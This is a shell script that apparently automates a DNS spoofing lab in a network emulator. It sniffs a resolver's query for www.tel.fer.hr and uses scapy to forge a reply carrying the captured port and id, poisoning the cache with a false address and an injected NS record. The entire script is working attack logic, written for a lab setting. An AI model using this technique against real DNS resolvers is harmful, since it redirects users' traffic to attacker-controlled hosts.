#!/bin/sh

err=1
count=1
until [ $err -eq 0 ] || [ $count -eq 6 ]; do
    echo ""
    echo "Try $count / 5..."
    count=$((count+1))

    # Create a fake DNS query to trigger spoofing
    echo 'import time
time.sleep(2)
send(IP(src="30.0.0.3", dst="30.0.0.2")/UDP(dport=53)/DNS\
(id=43322,qr=0,rd=1,\
qd=DNSQR(qname="www.tel.fer.hr")))
exit()' > /tmp/prepare_dnsspoof.scapy 
#exit()' | sudo himage attacker scapy &

    # Copy the scapy script to the attacker
    hcp /tmp/prepare_dnsspoof.scapy attacker:

    # Execute the script
    himage attacker scapy -c prepare_dnsspoof.scapy &

    # Catch the packet to get port and id of the DNS packet
    val=`sudo himage dnsZpm tcpdump -l -c 1 -ni eth0 '(port 53 && dst 20.0.0.2)'`

    port=`echo $val | cut -d' ' -f3 | cut -d'.' -f5`
    id=`echo $val | cut -d' ' -f6`

    # Send the fake DNS reply
    echo "send(IP(src=\"20.0.0.2\", dst=\"30.0.0.2\")/UDP(dport=$port)/DNS\
(id=$id,qr=1,ra=1,\
qd=DNSQR(qname=\"www.tel.fer.hr\"),\
an=DNSRR(ttl=10000,rrname=\"www.tel.fer.hr\",rdata=\"10.0.11.10\"),\
ns=DNSRR(type=\"NS\",ttl=10000,rrname=\"tel.fer.hr\",rdata=\"dnsTel.tel.fer.hr\"),\
ar=DNSRR(rrname=\"dnsTel.tel.fer.hr\",rdata=\"20.0.0.2\")\
))" | sudo himage attacker scapy > /tmp/scapy.log

    echo "Did it work?"

    # Running host command from the pc node to see if it works...
    sudo himage pc host -r www.tel.fer.hr
    sudo himage pc ping -c 3 www.tel.fer.hr
    err=$?
    if [ $err -eq 0 ]; then
	echo ""
	echo "Success!"
    fi
done
